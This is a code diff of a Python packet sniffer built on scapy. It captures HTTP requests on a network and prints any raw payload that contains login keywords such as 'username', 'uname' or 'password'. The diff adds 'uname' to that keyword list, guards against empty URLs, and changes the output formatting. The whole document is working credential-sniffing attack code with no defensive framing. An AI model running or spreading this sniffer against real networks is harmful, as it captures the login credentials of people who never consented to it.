@@ -17,12 +17,14 @@ def get_arguments():
 
 def get_url(packet):
     url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    if url:
+        return url
 
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
-        keywords = ["username", "user", "login", "password", "pass"]
+        keywords = ["username", "user", "uname", "login", "password", "pass"]
         for keyword in keywords:
             if keyword in load:
                 return load
@@ -36,10 +38,11 @@ def process_sniffed_packet(packet):
     # HTTP requests
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP Request --> " + url + "\n")
+        if url:
+            print("[+] HTTP Request --> " + url + "\n")
         login_info = get_login_info(packet)
         if login_info:
-            print("\n\n[+] Login Detected --> " + login_info + "\n\n")
+            print("\n\n[+] Login Detected ==> " + login_info + "\n\n")
 
 
 print("[+] Initiating Packet Sniffer..")
